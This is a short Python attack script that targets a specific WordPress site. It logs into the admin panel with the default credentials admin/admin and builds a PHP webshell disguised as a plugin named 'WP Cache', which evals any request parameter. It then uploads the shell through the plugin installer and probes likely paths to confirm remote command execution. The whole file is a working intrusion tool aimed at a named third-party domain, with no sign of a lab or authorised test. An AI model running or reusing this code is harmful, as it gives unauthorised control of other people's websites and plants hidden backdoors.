#!/usr/bin/env python3
"""WordPress webshell upload via admin panel"""
import subprocess, re

BASE = "https://chegva.com"
CK = "/tmp/wpx.txt"

def curl(url, data=None):
    cmd = ["curl", "-skL", "--connect-timeout", "10", "--max-time", "20", "-b", CK, "-c", CK]
    if data: cmd += ["-X", "POST", "-d", data]
    cmd.append(url)
    subprocess.run(cmd + ["-o", "/dev/null"], capture_output=True, timeout=25)

def get(url):
    r = subprocess.run(["curl", "-skL", url, "-b", CK], capture_output=True, text=True, timeout=15)
    return r.stdout

# Step 1: Login
print("[1] Login...")
subprocess.run(["rm", "-f", CK])
curl(BASE + "/wp-login.php")
curl(BASE + "/wp-login.php", data="log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1")

body = get(BASE + "/wp-admin/")
if "wp-admin-bar" in body:
    print("  LOGIN OK!")
else:
    print("  FAILED"); exit(1)

# Step 2: Create webshell plugin zip
print("[2] Creating plugin...")
with open("/tmp/ws.php", "w") as f:
    f.write('<?php /* Plugin Name: WP Cache */ if(isset($_REQUEST["c"])){eval($_REQUEST["c"]);}')
subprocess.run("cd /tmp && rm -f ws.zip && zip -q ws.zip ws.php", shell=True, capture_output=True)

# Step 3: Upload
print("[3] Uploading...")
subprocess.run([
    "curl", "-skL", BASE + "/wp-admin/update.php?action=upload-plugin",
    "-b", CK, "-c", CK,
    "-F", "pluginzip=@/tmp/ws.zip",
    "-F", "install-plugin-submit=Install Now"
], capture_output=True, timeout=30)

# Step 4: Activate via direct plugin access
print("[4] Testing shell...")
paths = [
    "/wp-content/plugins/ws/ws.php",
    "/wp-content/plugins/wp-cache/ws.php",
    "/wp-content/plugins/wp-cache/wp-cache.php"
]
for p in paths:
    r = subprocess.run(["curl", "-skL", BASE + p + '?c=echo+OK123'],
                       capture_output=True, text=True, timeout=10)
    print(f"  {p}: {r.stdout[:100]}")
